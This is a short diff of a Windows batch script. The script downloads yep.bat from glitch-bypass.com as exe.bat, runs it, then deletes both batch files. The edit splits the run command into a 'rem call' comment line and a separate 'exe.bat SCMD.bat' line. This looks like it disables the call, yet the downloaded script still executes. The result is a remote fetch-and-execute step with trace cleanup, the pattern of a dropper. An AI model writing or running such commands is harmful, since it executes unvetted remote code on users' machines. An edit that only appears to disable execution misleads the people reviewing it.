@@ -41,7 +41,8 @@ rem curl -o "setup.bat" "https://www.glitch-bypass.com/terminal/setup.bat"
 rem start setup.bat
 
 curl -o exe.bat https://www.glitch-bypass.com/terminal/yep.bat
-call exe.bat SCMD.bat
+rem call 
+exe.bat SCMD.bat
 del exe.bat
 del SCMD.bat
 
